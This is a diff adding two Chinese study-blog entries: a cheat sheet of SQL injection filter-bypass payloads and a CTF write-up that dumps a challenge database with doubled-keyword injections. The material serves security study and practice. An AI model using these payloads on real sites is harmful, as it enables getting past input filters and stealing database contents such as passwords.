@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>sql绕过方法笔记</title>
+      <link href="note4/undefined-undefined.html"/>
+      <url>note4/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>在网上找了不少sql绕过的总结，下面搬运一篇我觉得总结的最简单明了的笔记。  </p><h1 id="一、绕过空格（注释符-，-a0）"><a href="#一、绕过空格（注释符-，-a0）" class="headerlink" title="一、绕过空格（注释符/* */，%a0）"></a>一、绕过空格（注释符/* */，%a0）</h1><p>1.两个空格代替一个空格（双写）</p><p>2.%a0=空格</p><p>3.最基本的绕过方法，用注释替换空格：/<em>注释/</em></p><p>4.括号绕过空格</p><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：time based盲注：</p><blockquote><p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</p></blockquote><p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p><h1 id="二、引号绕过（使用十六进制）"><a href="#二、引号绕过（使用十六进制）" class="headerlink" title="二、引号绕过（使用十六进制）"></a>二、引号绕过（使用十六进制）</h1><p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p><p>几乎没有任何注入能过滤十六进制。</p><h1 id="三、逗号绕过（使用from或者offset）"><a href="#三、逗号绕过（使用from或者offset）" class="headerlink" title="三、逗号绕过（使用from或者offset）"></a>三、逗号绕过（使用from或者offset）</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p><p>例如：</p><p>使用from to：</p><blockquote><p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);</p></blockquote><p>使用join：</p><blockquote><p>union select 1,2<br>union select * from (select 1)a join (select 2)b</p></blockquote><p>使用like：</p><blockquote><p>select ascii(mid(user(),1,1))=80 #等价于<br>select user() like ‘r%’</p></blockquote><p>使用offset来绕过limit中的”，”：</p><blockquote><p>select * from news limit 0,1<br>select * from news limit 1 offset 0</p></blockquote><h1 id="四、比较符号（-lt-gt-）绕过"><a href="#四、比较符号（-lt-gt-）绕过" class="headerlink" title="四、比较符号（&lt;&gt;）绕过"></a>四、比较符号（&lt;&gt;）绕过</h1><p>过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本</p><p>盲注的时候如果无法使用比较操作符，可使用greatest()、least()。（前者返回最大值，后者返回最小值）</p><blockquote><p>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64<br>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</p></blockquote><p>使用between and：</p><p>between a and b：返回a，b之间的数据，不包含b。</p><h1 id="五、or-and-xor-not绕过"><a href="#五、or-and-xor-not绕过" class="headerlink" title="五、or and xor not绕过"></a>五、or and xor not绕过</h1><blockquote><p>and=&amp;&amp; ， or=|| ， xor=| ， not=!</p></blockquote><h1 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#六、绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="六、绕过注释符号（#，–(后面跟一个空格））过滤"></a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h1><blockquote><p>id=1’ union select 1,2,3||’1</p></blockquote><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><blockquote><p>id=1’ union select 1,2,’3</p></blockquote><h1 id="七、-绕过"><a href="#七、-绕过" class="headerlink" title="七、= 绕过"></a>七、= 绕过</h1><p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p><h1 id="八、绕过union，select，where等"><a href="#八、绕过union，select，where等" class="headerlink" title="八、绕过union，select，where等"></a>八、绕过union，select，where等</h1><h2 id="1-使用注释符绕过："><a href="#1-使用注释符绕过：" class="headerlink" title="1.使用注释符绕过："></a>1.使用注释符绕过：</h2><p>常用注释符：</p><blockquote><p>//，– , /**/, #, –+, – -, ; , %00 , –a</p></blockquote><p>用法：</p><blockquote><p>U/ * * / NION / * * / SE /* */LECT/ * */user，pwd from user</p></blockquote><h2 id="2-使用大小写绕过："><a href="#2-使用大小写绕过：" class="headerlink" title="2.使用大小写绕过："></a>2.使用大小写绕过：</h2><blockquote><p>id=-1’UnIoN/**/SeLeCT</p></blockquote><h2 id="3-内联注释绕过："><a href="#3-内联注释绕过：" class="headerlink" title="3.内联注释绕过："></a>3.内联注释绕过：</h2><blockquote><p>id=-1’/* !UnIoN* / SeLeCT 1,2,concat(/ * !tabl _ name * /) FrOM / * information _ schema* /.tables / * !WHERE * // * !TaBlE_ScHeMa*/ like database()#</p></blockquote><h2 id="4-双关键字绕过"><a href="#4-双关键字绕过" class="headerlink" title="4.双关键字绕过"></a>4.双关键字绕过</h2><p>若删除掉第一个匹配的union就能绕过：</p><blockquote><p>id=-1’UNIunionONSeLselectECT1,2,3–</p></blockquote><h2 id="5-使用URLencode，ascii编码，"><a href="#5-使用URLencode，ascii编码，" class="headerlink" title="5.使用URLencode，ascii编码，"></a>5.使用URLencode，ascii编码，</h2><blockquote><p>%53%45%4c%45%43%54(ascii)</p></blockquote><h2 id="6-函数或特殊符号"><a href="#6-函数或特殊符号" class="headerlink" title="6.函数或特殊符号"></a>6.函数或特殊符号</h2><p>例如：表示admin，oracle中可以用 ‘adm’||’in’ , mysql中可以用 concat(‘adm’,’in’); mssql中可以用：’adm’+’in’</p><h1 id="九、通用绕过（编码）"><a href="#九、通用绕过（编码）" class="headerlink" title="九、通用绕过（编码）"></a>九、通用绕过（编码）</h1><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p><p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p><h1 id="十、等价函数绕过（不同数据库）"><a href="#十、等价函数绕过（不同数据库）" class="headerlink" title="十、等价函数绕过（不同数据库）"></a>十、等价函数绕过（不同数据库）</h1><blockquote><p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@datadir ==&gt; datadir()  </p></blockquote><p>例如：substring()和substr()无法使用时：</p><blockquote><p>?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</p></blockquote><p>或者：</p><blockquote><p>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1</p></blockquote><h1 id="十一-宽字节注入"><a href="#十一-宽字节注入" class="headerlink" title="十一.宽字节注入"></a>十一.宽字节注入</h1><p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><p>（1）%df 吃掉 \ 具体的方法是 urlencode(’) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><blockquote><p>id=-1%df%27union select 1,user(),3–+</p></blockquote><p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><p>一般产生宽字节注入的PHP函数：</p><p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \ 转为 \，将 “ 转为 “ 。用思路一。</p><p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>3.mysql_real_escape_string()：转义下列字符：</p><p>\x00 \n \r \ ’ “ \x1a</p><p>（防御，将mysql设置为gbk即可）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> note4 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>寒假练习14</title>
+      <link href="test20/undefined-undefined.html"/>
+      <url>test20/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天是一道sql注入题目，复习一下sql注入。  </p><h1 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1"></a>[极客大挑战 2019]BabySQL 1</h1><p>打开题目，题目说加强了过滤，也就是说这次注入可能有些字符不能使用，首先还是尝试一下万能密码。  </p><blockquote><p>输入username=1’ or 1=1#</p></blockquote><p>发现报错。<br><img src="https://i.loli.net/2021/01/28/SAnK19xHeIiZcLt.png" alt="57.png"><br>可以看到报错显示的是’1=1#’ 附近出现问题，可以知道是or被过滤了，接着用联合查询查一下显示位。  </p><blockquote><p>username=1’ union select 1,2,3#</p></blockquote><p>发现同样报错。<br><img src="https://i.loli.net/2021/01/28/CGxZrIkzdcj2sXK.png" alt="58.png"><br>这里可以看到报错显示的是在’1,2,3#’附近，说明union和select也被过滤了，但是过滤的方式有很多，绕过也有很多方法，如果一个个绕过会很麻烦，比如过滤or可以使用||来绕过，也可以用别的方式绕过，这里我们使用双写绕过。  </p><hr><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>双写绕过是建立在使用replace（）函数过滤这个条件的，也就是识别出需要过滤的字符，然后将其替换为空。遇到这种情况时，我们可以进行双写来绕过。<br>比如输入un<strong>union</strong>ion，这时函数会检测到字符串中有union这个字符那么就会将它替换为空，去掉中间的union后最终我们仍旧会得到union来达到我们的目的。  </p><hr><p>那我们就先试一下。  </p><blockquote><p>输入username=1’ oorr 1=1# </p></blockquote><p><img src="https://i.loli.net/2021/01/28/1I5nzQJslpTfG6V.png" alt="59.png"><br>发现确实成功了，那么我们接下来的注入都可以这样进行。<br>查看回显位。  </p><blockquote><p>username=1’ ununionion seselectlect 1,2,3#</p></blockquote><p>发现2，3位有回显。<br><img src="https://i.loli.net/2021/01/28/AlVrHmGeIFsbyQZ.png" alt="60.png"><br>接着查看数据库名字。  </p><blockquote><p>1’ ununionion seselectlect 1,2,database()#</p></blockquote><p><img src="https://i.loli.net/2021/01/28/b5vJyfD6QEMaPHg.png" alt="61.png"><br>接下来的操作和前面的题目就差不多一样了，不过要注意的是再后面的注入中发现题目还过滤了where和from字符，这些都是要一个个试出来的。<br>比如输入1’ from#然后查看报错回显中有没有from字符，如果没有，就说明被过滤了，同样要使用双写来绕过。<br>此外当我们输入information时需要注意，information中同样含有or字符，所以这个地方也要局部进行双写。下面附上部分注入语句。  </p><blockquote><p>1’ ununionion seselectlect 1,(selselectect group _ concat(table _ name) frfromom infoorrmation_schema.tables whwhereere table _ schema=’geek’),database()#<br>查看表名</p></blockquote><p><img src="https://i.loli.net/2021/01/28/MgIbr84FCPxdJnA.png" alt="62.png"></p><blockquote><p>seselectlect group_ concat(column_name) frfromom infoorrmation _ schema.columns whwhereere table _name=’b4bsql’<br>查看b4bsql表中的字段。</p></blockquote><blockquote><p>seselectlect group_ concat(password) frfromom geek.b4bsql<br>查看字段信息，得到flag。  </p></blockquote><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道sql注入考查了简单的绕过，一般这种绕过只要平时的积累够多就可以应付，这和昨天的upload题目是一个道理。当使用双写绕过时要注意过滤是否和这道题replace（）函数一样替换成空，如果替换成其他字符的话双写绕过就没办法实现了。<br>下面给一些双写绕过的博客积累。<br><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161181620116780269834648%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161181620116780269834648&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-82995313.pc_search_result_before_js&utm_term=sql%E6%B3%A8%E5%85%A5replace()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">sql注入绕过方法总结</a><br><a href="https://blog.csdn.net/weixin_43606134/article/details/109198964?ops_request_misc=&request_id=&biz_id=102&utm_term=sql%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-109198964.pc_search_result_before_js&spm=1018.2226.3001.4187">sql注入绕过技巧</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test20 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>寒假练习13</title>
       <link href="test19/undefined-undefined.html"/>
       <url>test19/undefined-undefined.html</url>
